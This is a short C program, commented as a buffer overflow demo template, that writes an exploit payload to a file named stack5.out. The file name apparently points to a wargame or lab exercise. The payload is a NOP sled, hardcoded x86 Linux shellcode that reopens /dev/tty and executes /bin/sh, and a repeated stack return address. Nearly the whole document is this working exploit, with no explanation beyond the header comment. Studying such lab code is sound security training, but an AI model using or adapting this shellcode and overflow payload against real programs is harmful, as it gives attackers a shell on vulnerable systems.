#include <stdio.h>
#include <string.h>
#include <stdlib.h>

char code[] =
"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";


/* Template for buffer overflow demo.                                *
 *                                                                   *
 * The write_it function is seprate so that it can be modified to    *
 * be run multiple times; it's helpful to add arguments to this      *
 * function for testing                                              */

int write_it(FILE* fd, int skip)
{
    char addr[4] = "\x20\xf8\xff\xbf";
    for (int i = 0;i<64-strlen(code);i++)
      fprintf(fd, "\x90");
    //print shellcode
    for(int i = 0;i<strlen(code);i++)
      fprintf(fd, "%c",code[i]);
    for(int i = 0;i<skip;i++)
      fprintf(fd, "%s", addr);
}

int main(int argc, char** argv) {
    char fn[16];
    sprintf(fn, "stack5.out");
    FILE *fd = fopen(fn, "w");
    write_it(fd, 6);
    fclose(fd);
}
